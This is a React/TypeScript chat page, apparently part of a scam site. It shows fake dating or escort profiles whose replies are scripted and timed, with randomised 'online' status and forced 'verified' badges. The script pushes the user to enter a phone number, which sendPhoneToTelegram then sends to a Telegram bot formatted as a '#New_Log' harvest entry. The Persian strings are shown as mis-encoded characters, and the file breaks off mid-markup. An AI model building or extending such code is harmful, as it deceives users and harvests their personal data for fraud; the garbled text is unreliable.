import { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import NavBar from '../../components/base/NavBar';
import TabBar from '../../components/base/TabBar';
import { casesAPI } from '../../lib/supabase';

interface Message {
  id: string;
  text: string;
  isUser: boolean;
  timestamp: Date;
  isTyping?: boolean;
  type?: 'text' | 'system';
}

interface UserProfile {
  id: string;
  name: string;
  avatar: string;
  uniqueCode: string;
  isOnline: boolean;
  lastSeen: string;
  verified: boolean;
  location: string;
  age: number;
  description: string;
}

interface ChatRoom {
  id: string;
  caseData: any;
  messages: Message[];
  lastMessage?: string;
  lastMessageTime?: Date;
  unreadCount: number;
}

interface SystemConfig {
  telegramBotToken: string;
  telegramBotUsername: string;
  telegramChatId: string;
  paymentGatewayUrl: string;
  defaultFeeAmount: number;
}

const FIXED_CHAT_CODE = 'Cod_4961';

export default function Chat() {
  const navigate = useNavigate();
  
  const [messages, setMessages] = useState<Message[]>([]);
  const [inputText, setInputText] = useState('');
  const [isTyping, setIsTyping] = useState(false);
  const [userProfile, setUserProfile] = useState<UserProfile | null>(null);
  const [showAccessDenied, setShowAccessDenied] = useState(false);
  const [chatStep, setChatStep] = useState(0);
  const [userMessageCount, setUserMessageCount] = useState(0);
  const [showPhoneInput, setShowPhoneInput] = useState(false);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [chatClosed, setChatClosed] = useState(false);
  const [showFinalNotice, setShowFinalNotice] = useState(false);
  
  const [showChatList, setShowChatList] = useState(true);
  const [currentChatId, setCurrentChatId] = useState<string | null>(null);
  const [chatRooms, setChatRooms] = useState<ChatRoom[]>([]);
  const [showCodeInput, setShowCodeInput] = useState(false);
  const [codeInput, setCodeInput] = useState('');
  const [showConnectionOptions, setShowConnectionOptions] = useState(false);
  const [selectedCase, setSelectedCase] = useState<any>(null);
  const [isInActiveChat, setIsInActiveChat] = useState(false);
  const [activeChatTimer, setActiveChatTimer] = useState<NodeJS.Timeout | null>(null);
  const [systemConfig, setSystemConfig] = useState<SystemConfig>({
    telegramBotToken: '',
    telegramBotUsername: '',
    telegramChatId: '',
    paymentGatewayUrl: 'https://payment.example.com',
    defaultFeeAmount: 250000
  });

  const messagesEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    loadSystemConfig();
    loadChatRooms();
    
    const activeChat = localStorage.getItem('PERSISTENT_ACTIVE_CHAT');
    if (activeChat) {
      try {
        const chatData = JSON.parse(activeChat);
        
        const chatAge = Date.now() - (chatData.timestamp || 0);
        const maxAge = 7 * 24 * 60 * 60 * 1000;
        
        if (chatAge < maxAge) {
          setIsInActiveChat(true);
          setCurrentChatId(chatData.caseId);
          setSelectedCase(chatData.caseData);
          setUserProfile(chatData.userProfile);
          
          // ÿ±ŸÅÿπ ŸÖÿ¥⁄©ŸÑ: ÿ™ÿ®ÿØ€åŸÑ timestamp ÿ®Ÿá Date
          const restoredMessages = chatData.messages ? chatData.messages.map((msg: any) => ({
            ...msg,
            timestamp: new Date(msg.timestamp)
          })) : [];
          
          setMessages(restoredMessages);
          setShowChatList(false);
          setUserMessageCount(chatData.userMessageCount || 0);
          setChatStep(chatData.chatStep || 0);
          setShowPhoneInput(chatData.showPhoneInput || false);
          setPhoneNumber(chatData.phoneNumber || '');
          setChatClosed(chatData.chatClosed || false);
          setShowFinalNotice(chatData.showFinalNotice || false);
          
          console.log('üîÑ ⁄Üÿ™ ŸÅÿπÿßŸÑ Ÿæÿß€åÿØÿßÿ± ÿ®ÿßÿ≤€åÿßÿ®€å ÿ¥ÿØ:', chatData.caseData.name);
          
          if (chatData.isTyping && !chatData.chatClosed) {
            setIsTyping(true);
          }
        } else {
          localStorage.removeItem('PERSISTENT_ACTIVE_CHAT');
          localStorage.removeItem('BACKUP_ACTIVE_CHAT');
          localStorage.removeItem('SAFE_ACTIVE_CHAT');
          localStorage.removeItem('PROTECTED_CHAT_STATE');
          console.log('üóëÔ∏è ⁄Üÿ™ ŸÖŸÜŸÇÿ∂€å ÿ¥ÿØŸá ÿ≠ÿ∞ŸÅ ÿ¥ÿØ');
        }
      } catch (error) {
        console.error('ÿÆÿ∑ÿß ÿØÿ± ÿ®ÿßÿ≤€åÿßÿ®€å ⁄Üÿ™ ŸÅÿπÿßŸÑ:', error);
        localStorage.removeItem('PERSISTENT_ACTIVE_CHAT');
        localStorage.removeItem('BACKUP_ACTIVE_CHAT');
        localStorage.removeItem('SAFE_ACTIVE_CHAT');
        localStorage.removeItem('PROTECTED_CHAT_STATE');
      }
    }
  }, []);

  const saveActiveChatPersistent = () => {
    if (isInActiveChat && currentChatId && selectedCase && userProfile) {
      const activeChatData = {
        caseId: currentChatId,
        caseData: selectedCase,
        userProfile: userProfile,
        messages: messages,
        userMessageCount: userMessageCount,
        chatStep: chatStep,
        showPhoneInput: showPhoneInput,
        phoneNumber: phoneNumber,
        chatClosed: chatClosed,
        showFinalNotice: showFinalNotice,
        isTyping: isTyping,
        timestamp: Date.now(),
        version: '3.0'
      };
      
      const backupKeys = [
        'PERSISTENT_ACTIVE_CHAT',
        'BACKUP_ACTIVE_CHAT',
        'SAFE_ACTIVE_CHAT',
        'PROTECTED_CHAT_STATE'
      ];
      
      backupKeys.forEach(key => {
        try {
          localStorage.setItem(key, JSON.stringify(activeChatData));
        } catch (error) {
          console.warn(`ÿÆÿ∑ÿß ÿØÿ± ÿ∞ÿÆ€åÿ±Ÿá ${key}:`, error);
        }
      });
      
      console.log('üíæ ⁄Üÿ™ ŸÅÿπÿßŸÑ Ÿæÿß€åÿØÿßÿ± ÿ∞ÿÆ€åÿ±Ÿá ÿ¥ÿØ');
    }
  };

  useEffect(() => {
    if (isInActiveChat) {
      const interval = setInterval(() => {
        saveActiveChatPersistent();
      }, 2000);

      return () => clearInterval(interval);
    }
  }, [isInActiveChat, messages, userMessageCount, chatStep, showPhoneInput, phoneNumber, chatClosed, showFinalNotice, isTyping]);

  useEffect(() => {
    if (isInActiveChat) {
      saveActiveChatPersistent();
    }
  }, [messages, userMessageCount, chatStep, isInActiveChat, showPhoneInput, phoneNumber, chatClosed, showFinalNotice]);

  const loadSystemConfig = () => {
    const savedConfig = localStorage.getItem('systemConfig');
    if (savedConfig) {
      setSystemConfig({ ...systemConfig, ...JSON.parse(savedConfig) });
    }
  };

  const loadChatRooms = async () => {
    console.log('üì• ÿ®ÿßÿ±⁄Øÿ∞ÿßÿ±€å ⁄Üÿ™‚ÄåŸáÿß€å ⁄©ÿßÿ±ÿ®ÿ± ÿßÿ≤ ÿØ€åÿ™ÿßÿ®€åÿ≥...');
    
    const savedChats = localStorage.getItem('userChatRooms');
    let existingRooms: ChatRoom[] = [];
    
    if (savedChats) {
      try {
        existingRooms = JSON.parse(savedChats);
      } catch (error) {
        console.error('ÿÆÿ∑ÿß ÿØÿ± ÿ®ÿßÿ±⁄Øÿ∞ÿßÿ±€å ⁄Üÿ™‚ÄåŸáÿß:', error);
      }
    }

    const favorites = localStorage.getItem('favoritesCases');
    if (favorites) {
      try {
        const favoriteCases = JSON.parse(favorites);
        const existingChatIds = existingRooms.map(chat => chat.id);
        
        for (const favoriteCase of favoriteCases) {
          try {
            const updatedCase = await casesAPI.getById(favoriteCase.id);
            
            if (updatedCase) {
              if (!existingChatIds.includes(favoriteCase.id.toString())) {
                const newChatRoom: ChatRoom = {
                  id: favoriteCase.id.toString(),
                  caseData: updatedCase,
                  messages: [],
                  lastMessage: '⁄Üÿ™ ÿ¨ÿØ€åÿØ ÿ¥ÿ±Ÿàÿπ ÿ¥ÿØ',
                  lastMessageTime: new Date(favoriteCase.addedAt),
                  unreadCount: 0
                };
                existingRooms.push(newChatRoom);
              } else {
                const roomIndex = existingRooms.findIndex(room => room.id === favoriteCase.id.toString());
                if (roomIndex !== -1) {
                  existingRooms[roomIndex].caseData = updatedCase;
                }
              }
            }
          } catch (error) {
            console.warn(`ÿÆÿ∑ÿß ÿØÿ± ÿ®ÿ±Ÿàÿ≤ÿ±ÿ≥ÿßŸÜ€å ⁄©€åÿ≥ ${favoriteCase.id}:`, error);
            if (!existingChatIds.includes(favoriteCase.id.toString())) {
              const newChatRoom: ChatRoom = {
                id: favoriteCase.id.toString(),
                caseData: favoriteCase,
                messages: [],
                lastMessage: '⁄Üÿ™ ÿ¨ÿØ€åÿØ ÿ¥ÿ±Ÿàÿπ ÿ¥ÿØ',
                lastMessageTime: new Date(favoriteCase.addedAt),
                unreadCount: 0
              };
              existingRooms.push(newChatRoom);
            }
          }
        }
      } catch (error) {
        console.error('ÿÆÿ∑ÿß ÿØÿ± ÿ®ÿßÿ±⁄Øÿ∞ÿßÿ±€å ÿπŸÑÿßŸÇŸá‚ÄåŸÖŸÜÿØ€å‚ÄåŸáÿß:', error);
      }
    }

    setChatRooms(existingRooms);
    console.log(`‚úÖ ${existingRooms.length} ⁄Üÿ™ ÿ®ÿßÿ±⁄Øÿ∞ÿßÿ±€å ÿ¥ÿØ (ÿ®ÿß ŸáŸÖ⁄ØÿßŸÖ‚Äåÿ≥ÿßÿ≤€å ÿØ€åÿ™ÿßÿ®€åÿ≥)`);
  };

  const saveChatRooms = (rooms: ChatRoom[]) => {
    try {
      localStorage.setItem('userChatRooms', JSON.stringify(rooms));
      setChatRooms(rooms);
      console.log('üíæ ⁄Üÿ™‚ÄåŸáÿß ÿ∞ÿÆ€åÿ±Ÿá ÿ¥ÿØŸÜÿØ');
    } catch (error) {
      console.error('ÿÆÿ∑ÿß ÿØÿ± ÿ∞ÿÆ€åÿ±Ÿá ⁄Üÿ™‚ÄåŸáÿß:', error);
    }
  };

  const openChatRoom = (caseData: any) => {
    setSelectedCase(caseData);
    setShowConnectionOptions(true);
    setShowChatList(false);
  };

  const handleConnectionRequest = () => {
    navigate('/verification/' + selectedCase.id);
  };

  const handleChatCodeEntry = () => {
    setShowCodeInput(true);
    setShowConnectionOptions(false);
  };

  const handleCodeSubmit = () => {
    if (codeInput.trim() === FIXED_CHAT_CODE) {
      startActiveChatPersistent(selectedCase);
      setShowCodeInput(false);
      setCodeInput('');
    } else {
      alert('ŸÑÿ∑ŸÅÿßŸã ÿßÿ≤ ŸÇÿ≥ŸÖÿ™ ÿØÿ±ÿÆŸàÿßÿ≥ÿ™ ÿßÿ±ÿ™ÿ®ÿßÿ∑ÿå ⁄©ÿØ Ÿàÿ±ŸàÿØ ÿÆŸàÿØ ÿ±ÿß ÿ™Ÿá€åŸá Ÿà ⁄©ÿØ ÿµÿ≠€åÿ≠ ÿ±ÿß Ÿàÿßÿ±ÿØ ŸÜŸÖÿß€å€åÿØ');
      setCodeInput('');
    }
  };

  const startActiveChatPersistent = (caseData: any) => {
    const chatId = caseData.id.toString();
    setCurrentChatId(chatId);
    setShowChatList(false);
    setShowConnectionOptions(false);
    setShowCodeInput(false);
    setIsInActiveChat(true);

    const userProfile: UserProfile = {
      id: caseData.id.toString(),
      name: caseData.name,
      avatar: caseData.image,
      uniqueCode: generateShortUniqueCode(),
      isOnline: Math.random() > 0.3,
      lastSeen: generateLastSeen(),
      verified: caseData.verified || true,
      location: caseData.location,
      age: caseData.age || 25,
      description: caseData.description || '⁄©ÿßÿ±ÿ®ÿ± ÿ™ÿß€å€åÿØ ÿ¥ÿØŸá'
    };

    setUserProfile(userProfile);

    const existingChat = chatRooms.find(room => room.id === chatId);
    if (existingChat && existingChat.messages.length > 0) {
      setMessages(existingChat.messages);
    } else {
      const welcomeMessage: Message = {
        id: '1',
        text: `ÿ≥ŸÑÿßŸÖ! ŸÖŸÜ ${caseData.name.split(' - ')[0]} Ÿáÿ≥ÿ™ŸÖ! ŸÖÿ±ÿ≥€å ⁄©Ÿá ŸÖŸÜŸà ÿßŸÜÿ™ÿÆÿßÿ® ⁄©ÿ±ÿØ€å üíï ŸÑÿ∑ŸÅÿßŸã ŸÖŸÜÿ™ÿ∏ÿ± ÿ®ŸÖŸàŸÜÿå ÿ®Ÿá ÿ≤ŸàÿØ€å ÿ¢ŸÜŸÑÿß€åŸÜ ŸÖ€åÿ¥ŸÖ üòä`,
        isUser: false,
        timestamp: new Date(),
        type: 'text'
      };
      setMessages([welcomeMessage]);
      setChatStep(1);
    }

    setTimeout(() => {
      saveActiveChatPersistent();
    }, 100);

    console.log('üöÄ ⁄Üÿ™ ŸÅÿπÿßŸÑ Ÿæÿß€åÿØÿßÿ± ÿ¥ÿ±Ÿàÿπ ÿ¥ÿØ ÿ®ÿß:', caseData.name);
  };
    const removeChatRoom = (chatId: string) => {
    if (confirm('ÿ¢€åÿß ŸÖÿ∑ŸÖÿ¶ŸÜ Ÿáÿ≥ÿ™€åÿØ ⁄©Ÿá ŸÖ€å‚ÄåÿÆŸàÿßŸá€åÿØ ÿß€åŸÜ ⁄©€åÿ≥ ÿ±ÿß ÿßÿ≤ ŸÑ€åÿ≥ÿ™ ÿ≠ÿ∞ŸÅ ⁄©ŸÜ€åÿØÿü')) {
      const updatedRooms = chatRooms.filter(room => room.id !== chatId);
      saveChatRooms(updatedRooms);
      
      try {
        const favorites = JSON.parse(localStorage.getItem('favoritesCases') || '[]');
        const updatedFavorites = favorites.filter((fav: any) => fav.id.toString() !== chatId);
        localStorage.setItem('favoritesCases', JSON.stringify(updatedFavorites));
        
        console.log('üóëÔ∏è ⁄©€åÿ≥ ÿßÿ≤ ⁄Üÿ™ Ÿà ÿπŸÑÿßŸÇŸá‚ÄåŸÖŸÜÿØ€å‚ÄåŸáÿß ÿ≠ÿ∞ŸÅ ÿ¥ÿØ');
      } catch (error) {
        console.error('ÿÆÿ∑ÿß ÿØÿ± ÿ≠ÿ∞ŸÅ ÿßÿ≤ ÿπŸÑÿßŸÇŸá‚ÄåŸÖŸÜÿØ€å‚ÄåŸáÿß:', error);
      }
    }
  };

  const backToChatList = () => {
    if (activeChatTimer) {
      clearTimeout(activeChatTimer);
      setActiveChatTimer(null);
    }

    if (isInActiveChat && !chatClosed) {
      console.log('üîÅ ÿ®ÿßÿ≤⁄Øÿ¥ÿ™ ÿ®Ÿá ŸÑ€åÿ≥ÿ™ ⁄Üÿ™‚ÄåŸáÿß (⁄Üÿ™ ŸÅÿπÿßŸÑ ÿ≠ŸÅÿ∏ ÿ¥ÿØ)');
    }

    setShowChatList(true);
    setShowConnectionOptions(false);
    setShowCodeInput(false);
    setSelectedCase(null);
  };

  const exitActiveChatCompletely = () => {
    if (confirm('ÿ¢€åÿß ŸÖÿ∑ŸÖÿ¶ŸÜ Ÿáÿ≥ÿ™€åÿØ ⁄©Ÿá ŸÖ€å‚ÄåÿÆŸàÿßŸá€åÿØ ⁄Üÿ™ ŸÅÿπÿßŸÑ ÿ±ÿß ÿ®Ÿá ÿ∑Ÿàÿ± ⁄©ÿßŸÖŸÑ Ÿæÿß€åÿßŸÜ ÿØŸá€åÿØÿü')) {
      localStorage.removeItem('PERSISTENT_ACTIVE_CHAT');
      localStorage.removeItem('BACKUP_ACTIVE_CHAT');
      localStorage.removeItem('SAFE_ACTIVE_CHAT');
      localStorage.removeItem('PROTECTED_CHAT_STATE');
      
      setIsInActiveChat(false);
      setCurrentChatId(null);
      setUserProfile(null);
      setMessages([]);
      setChatClosed(false);
      setShowFinalNotice(false);
      setShowPhoneInput(false);
      setUserMessageCount(0);
      setChatStep(0);
      setIsTyping(false);
      
      console.log('üßπ ⁄Üÿ™ ŸÅÿπÿßŸÑ ÿ®Ÿá ÿ∑Ÿàÿ± ⁄©ÿßŸÖŸÑ Ÿæÿß⁄© ÿ¥ÿØ');
    }
  };

  const generateShortUniqueCode = () => {
    const timestamp = Date.now().toString().slice(-4);
    const random = Math.floor(Math.random() * 999).toString().padStart(3, '0');
    return `C${timestamp}-${random}`;
  };

  const generateLastSeen = () => {
    const minutes = Math.floor(Math.random() * 15) + 1;
    return `${minutes} ÿØŸÇ€åŸÇŸá Ÿæ€åÿ¥`;
  };

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  };

  useEffect(() => {
    scrollToBottom();
  }, [messages]);

  const sendMessage = async (text?: string) => {
    const messageText = text || inputText;
    if (!messageText.trim()) return;
    if (chatClosed) return;

    const userMessage: Message = {
      id: Date.now().toString(),
      text: messageText,
      isUser: true,
      timestamp: new Date(),
      type: 'text'
    };

    setMessages(prev => [...prev, userMessage]);
    setInputText('');
    setUserMessageCount(prev => prev + 1);
    
    handleChatFlowImproved(userMessageCount + 1);
  };

  const handleChatFlowImproved = (messageCount: number) => {
    if (messageCount === 1) {
      const timer = setTimeout(() => {
        setIsTyping(true);
        
        setTimeout(() => {
          const response: Message = {
            id: Date.now().toString(),
            text: 'ÿ≥ŸÑÿßŸÖ! ⁄ÜŸá ŸÜŸàÿπ ÿ±ÿßÿ®ÿ∑Ÿá‚Äåÿß€å ÿßÿ≤ ŸÖŸÜ ŸÖ€åÿÆŸàÿß€åÿüÿü ü§îüí≠',
            isUser: false,
            timestamp: new Date(),
            type: 'text'
          };
          
          setMessages(prev => [...prev, response]);
          setIsTyping(false);
          
          if (userProfile) {
            setUserProfile(prev => prev ? {...prev, isOnline: true, lastSeen: 'ÿ¢ŸÜŸÑÿß€åŸÜ'} : null);
          }
          
          setTimeout(() => saveActiveChatPersistent(), 100);
        }, 3000);
      }, 120000);
      
      setActiveChatTimer(timer);
    } else if (messageCount === 2) {
      const timer = setTimeout(() => {
        setIsTyping(true);
        
        setTimeout(() => {
          const response: Message = {
            id: Date.now().toString(),
            text: 'ÿßŸà⁄©€åŸá ÿπÿ≤€åÿ≤ŸÖ! ŸÅŸÇÿ∑ ŸÖŸÜ ÿ¥ÿ®ÿß ŸÜŸÖ€åÿ™ŸàŸÜŸÖ ÿ®€åÿßŸÖ ŸàŸÑ€å ÿ±Ÿàÿ≤ÿß ÿßŸà⁄©€åŸá üòä ÿ™ÿß€åŸÖŸÖ ŸÖ€åÿ™ŸàŸÜŸÖ ÿßÿ≤ ÿ≥ÿßÿπÿ™ €±€∞ ÿµÿ®ÿ≠ ÿ™ÿß €≤€≤:€∞€∞ ÿ®ÿßŸáÿßÿ™ ÿØÿ± ÿßÿ±ÿ™ÿ®ÿßÿ∑ ÿ®ÿßÿ¥ŸÖ. ÿß⁄ØŸá ŸáŸÖ ŸÖ€åÿÆŸàÿß€å ⁄©Ÿá ÿ¥ÿ® ÿ®€åÿßŸÖÿå ÿÆŸàÿØŸÖ ŸÖ⁄©ÿßŸÜ ÿØÿßÿ±ŸÖ - ŸÖ⁄©ÿßŸÜ ÿ∫ÿ±€åÿ®Ÿá ÿ±Ÿà ÿ¥ÿ±ŸÖŸÜÿØŸá... ÿ®ÿßÿ± ÿßŸàŸÑ ŸÜŸÖ€åÿ™ŸàŸÜŸÖ ÿ®€åÿßŸÖ üôÇüíû ÿß⁄Øÿ± ÿßŸà⁄©€å‚Äåÿß€å ÿ®ÿß ÿ¥ÿ±ÿß€åÿ∑ŸÖ ÿ®⁄ØŸà ⁄©Ÿá ÿ™ÿß€å€åÿØ ÿßÿ±ÿ™ÿ®ÿßÿ∑ ÿ±Ÿà ÿ®ÿØŸÖ Ÿà ÿ®ÿπÿØÿ¥ ÿ®ÿß ŸáŸÖ ÿØÿ± ÿßÿ±ÿ™ÿ®ÿßÿ∑ ÿ®ÿßÿ¥€åŸÖ Ÿàÿßÿ≥Ÿá ŸÇÿ±ÿßÿ±!',
            isUser: false,
            timestamp: new Date(),
            type: 'text'
          };
          
          setMessages(prev => [...prev, response]);
          setIsTyping(false);
          
          setTimeout(() => {
            const finalResponse: Message = {
              id: (Date.now() + 1).toString(),
              text: 'ŸÖŸÜ ÿ™ÿß€å€åÿØ ÿßÿ±ÿ™ÿ®ÿßÿ∑ ÿ±Ÿà ÿØÿßÿØŸÖ! ÿ™Ÿà ŸáŸÖ ÿ™ÿß€å€åÿØ ⁄©ŸÜ ⁄©Ÿá ÿ®ÿß ŸáŸÖ ÿØÿ± ÿßÿ±ÿ™ÿ®ÿßÿ∑ ÿ®ÿßÿ¥€åŸÖ üòä ŸÅŸÇÿ∑ ÿ≠ÿ™ŸÖÿßŸã ÿ≠ÿ™ŸÖÿßŸã ŸàŸÇÿ™€å ÿ¥ŸÖÿßÿ±ŸÖŸà ÿßÿ≤ ŸÖÿ¨ŸÖŸàÿπŸá ⁄Øÿ±ŸÅÿ™€åÿå ÿß⁄Øÿ± ÿÆŸàÿßÿ≥ÿ™€å ÿ≤ŸÜ⁄Ø ÿ®ÿ≤ŸÜ€å ŸÇÿ®ŸÑÿ¥ ÿ®⁄ØŸà ⁄©Ÿá ÿßÿ≤ ÿ∑ÿ±ŸÅ ÿß€åŸÜ ŸÖÿ¨ŸÖŸàÿπŸá‚Äåÿß€å Ÿà⁄Øÿ±ŸÜŸá ÿ¨Ÿàÿßÿ® ŸÜŸÖ€åÿØŸÖ... üôÇüìû',
              isUser: false,
              timestamp: new Date(),
              type: 'text'
            };
            
            setMessages(prev => [...prev, finalResponse]);
            
            setTimeout(() => {
              const systemMessage: Message = {
                id: (Date.now() + 2).toString(),
                text: '‚úÖ ÿßÿ±ÿ™ÿ®ÿßÿ∑ ÿ¥ŸÖÿß ÿ®ÿß ⁄©€åÿ≥ ŸÖŸàÿ±ÿØ ŸÜÿ∏ÿ± ÿ™ÿß€å€åÿØ ÿ¥ÿØ! ŸÑÿ∑ŸÅÿßŸã ÿ¥ŸÖÿßÿ±Ÿá ÿ™ŸÖÿßÿ≥ ÿÆŸàÿØ ÿ±ÿß Ÿàÿßÿ±ÿØ ⁄©ŸÜ€åÿØ:',
                isUser: false,
                timestamp: new Date(),
                type: 'system'
              };
              
              setMessages(prev => [...prev, systemMessage]);
              setShowPhoneInput(true);
              
              setTimeout(() => saveActiveChatPersistent(), 100);
            }, 2000);
          }, 30000);
          
          setTimeout(() => saveActiveChatPersistent(), 100);
        }, 3000);
      }, 120000);
      
      setActiveChatTimer(timer);
    }
  };

  const handlePhoneSubmit = () => {
    if (!phoneNumber.trim() || phoneNumber.length < 11) {
      alert('ŸÑÿ∑ŸÅÿßŸã ÿ¥ŸÖÿßÿ±Ÿá ÿ™ŸÖÿßÿ≥ ŸÖÿπÿ™ÿ®ÿ± Ÿàÿßÿ±ÿØ ⁄©ŸÜ€åÿØ');
      return;
    }

    sendPhoneToTelegram();
    
    const confirmMessage: Message = {
      id: Date.now().toString(),
      text: `ü•á Success Phone: ${phoneNumber}`,
      isUser: false,
      timestamp: new Date(),
      type: 'system'
    };
    
    setMessages(prev => [...prev, confirmMessage]);
    setShowPhoneInput(false);
    
    setTimeout(() => {
      const noticeMessage1: Message = {
        id: Date.now().toString(),
        text: 'ÿ™ÿß ÿ≥ÿßÿπÿßÿ™ ÿ¢€åŸÜÿØŸá ŸáŸÖ⁄©ÿßÿ±ÿßŸÜ ŸÖÿß ÿ®ÿ±ÿß€å ÿ±ÿ≤ÿ±Ÿà ÿ®ÿß ÿ¥ŸÖÿß ÿ™ŸÖÿßÿ≥ ⁄Øÿ±ŸÅÿ™Ÿá ÿÆŸàÿßŸáÿØ ÿ¥ÿØ. ŸÑÿ∑ŸÅÿßŸã ÿØÿ± ÿØÿ≥ÿ™ÿ±ÿ≥ ÿ®ÿßÿ¥€åÿØ... ÿ±ÿ≤ÿ±Ÿà ÿ±ÿßÿ®ÿ∑Ÿá €åÿß ÿßÿ≤ ÿ∑ÿ±€åŸÇ ÿ™ŸÖÿßÿ≥ €åÿß ÿßÿ≤ ÿ∑ÿ±€åŸÇ Ÿæ€åÿßŸÖ⁄© ÿ®Ÿá ÿ¥ŸÖÿß ÿßÿπŸÑÿßŸÖ ÿÆŸàÿßŸáÿØ ÿ¥ÿØ.',
        isUser: false,
        timestamp: new Date(),
        type: 'system'
      };
      
      setMessages(prev => [...prev, noticeMessage1]);
      
      setTimeout(() => {
        setShowFinalNotice(true);
        setTimeout(() => {
          setChatClosed(true);
          setTimeout(() => saveActiveChatPersistent(), 100);
        }, 10000);
      }, 5000);
    }, 2000);
  };

  const sendPhoneToTelegram = () => {
    const currentDate = new Date();
    const persianDate = currentDate.toLocaleDateString('fa-IR');
    const persianTime = currentDate.toLocaleTimeString('fa-IR');

    const message = `#New_Log ü´¶
"" "" "" "" "" "" "" "" "" ""
üìÄName : <code>ÿ¥ÿ±Ÿàÿπ ⁄Üÿ™ ŸÖŸàŸÅŸÇ</code>
üíøPhone : <code>${phoneNumber}</code>
ü™Ä#Code_meli : <code>${userProfile?.uniqueCode}</code>
"" "" "" "" "" "" "" "" "" ""
üï∞Time : ${persianDate}, ${persianTime}`;

    if (systemConfig.telegramBotToken && systemConfig.telegramChatId) {
      const telegramUrl = `https://api.telegram.org/bot${systemConfig.telegramBotToken}/sendMessage`;
      
      fetch(telegramUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: systemConfig.telegramChatId,
          text: message,
          parse_mode: 'HTML'
        })
      }).then(response => {
        if (response.ok) {
          console.log('‚úÖ Ÿæ€åÿßŸÖ ⁄Üÿ™ ÿ®ÿß ŸÖŸàŸÅŸÇ€åÿ™ ÿ®Ÿá ÿ™ŸÑ⁄Øÿ±ÿßŸÖ ÿßÿ±ÿ≥ÿßŸÑ ÿ¥ÿØ');
        } else {
          console.error('‚ùå ÿÆÿ∑ÿß ÿØÿ± ÿßÿ±ÿ≥ÿßŸÑ Ÿæ€åÿßŸÖ ⁄Üÿ™ ÿ®Ÿá ÿ™ŸÑ⁄Øÿ±ÿßŸÖ');
        }
      }).catch(error => {
        console.error('‚ùå ÿÆÿ∑ÿß ÿØÿ± ÿßÿ±ÿ≥ÿßŸÑ Ÿæ€åÿßŸÖ ⁄Üÿ™ ÿ®Ÿá ÿ™ŸÑ⁄Øÿ±ÿßŸÖ:', error);
      });
    } else {
      console.log('‚ÑπÔ∏è ÿ™ŸÜÿ∏€åŸÖÿßÿ™ ÿ™ŸÑ⁄Øÿ±ÿßŸÖ €åÿßŸÅÿ™ ŸÜÿ¥ÿØ - Ÿæ€åÿßŸÖ:', message);
    }
  };

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault();
      sendMessage();
    }
  };

  if (chatClosed) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-50 via-gray-100 to-gray-200 flex items-center justify-center">
        <div className="bg-white/95 backdrop-blur-sm rounded-3xl p-8 shadow-xl text-center max-w-md mx-4">
          <div className="w-20 h-20 bg-gray-100 rounded-full flex items-center justify-center mx-auto mb-6">
            <i className="ri-chat-off-line text-gray-400 text-3xl"></i>
          </div>
          <h3 className="text-xl font-bold text-gray-800 mb-3">⁄Üÿ™ ÿ®ÿ≥ÿ™Ÿá ÿ¥ÿØ</h3>
          <p className="text-gray-600 mb-6 leading-relaxed">
            ÿßÿ±ÿ™ÿ®ÿßÿ∑ ÿ¥ŸÖÿß ÿ®ÿß ⁄©€åÿ≥ ŸÖŸàÿ±ÿØ ŸÜÿ∏ÿ± ÿ´ÿ®ÿ™ ÿ¥ÿØ. ÿ®Ÿá ÿ≤ŸàÿØ€å ŸáŸÖ⁄©ÿßÿ±ÿßŸÜ ŸÖÿß ÿ®ÿß ÿ¥ŸÖÿß ÿ™ŸÖÿßÿ≥ ÿÆŸàÿßŸáŸÜÿØ ⁄Øÿ±ŸÅÿ™.
          </p>
          <button
            onClick={backToChatList}
            className="w-full bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white font-bold py-3 px-6 rounded-2xl transition-all duration-300"
          >
            ÿ®ÿßÿ≤⁄Øÿ¥ÿ™ ÿ®Ÿá ŸÑ€åÿ≥ÿ™ ⁄Üÿ™‚ÄåŸáÿß
          </button>
        </div>
      </div>
    );
  }

  if (showCodeInput) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-purple-50 via-indigo-50 to-blue-100">
        <NavBar title="⁄©ÿØ Ÿàÿ±ŸàÿØ ÿ®Ÿá ⁄Üÿ™" showBack={true} />

        <div className="pt-20 pb-20 px-4">
          <div className="bg-white/95 backdrop-blur-sm rounded-3xl p-8 shadow-xl text-center">
            <div className="w-20 h-20 bg-gradient-to-r from-purple-500 to-pink-600 rounded-full flex items-center justify-center mx-auto mb-6">
              <i className="ri-key-2-line text-white text-3xl"></i>
            </div>
            
            <h2 className="text-2xl font-bold text-gray-800 mb-3">⁄©ÿØ Ÿàÿ±ŸàÿØ ÿ®Ÿá ⁄Üÿ™</h2>
            <p className="text-gray-600 mb-6">⁄©ÿØ Ÿàÿ±ŸàÿØ ÿÆŸàÿØ ÿ±ÿß Ÿàÿßÿ±ÿØ ⁄©ŸÜ€åÿØ</p>
            
            <div className="mb-6">
              <input
                type="text"
                value={codeInput}
                onChange={(e) => setCodeInput(e.target.value)}
                placeholder="ŸÖÿ´ÿßŸÑ: Cod_01"
                className="w-full bg-gray-50 border border-gray-200 rounded-2xl px-5 py-4 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent text-center font-mono text-lg"
              />
            </div>

            <div className="space-y-3 mb-6">
              <button
                onClick={handleCodeSubmit}
                className="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold py-4 px-6 rounded-2xl shadow-lg transition-all duration-300"
              >
                ÿ™ÿß€å€åÿØ ⁄©ÿØ
              </button>
              
              <button
                onClick={handleConnectionRequest}
                className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white font-semibold py-3 px-6 rounded-2xl shadow-lg transition-all duration-300"
              >
                ÿØÿ±ÿÆŸàÿßÿ≥ÿ™ ÿßÿ±ÿ™ÿ®ÿßÿ∑
              </button>
            </div>

            <button
              onClick={backToChatList}
              className="text-gray-500 hover:text-gray-700 text-sm"
            >
              ÿ®ÿßÿ≤⁄Øÿ¥ÿ™
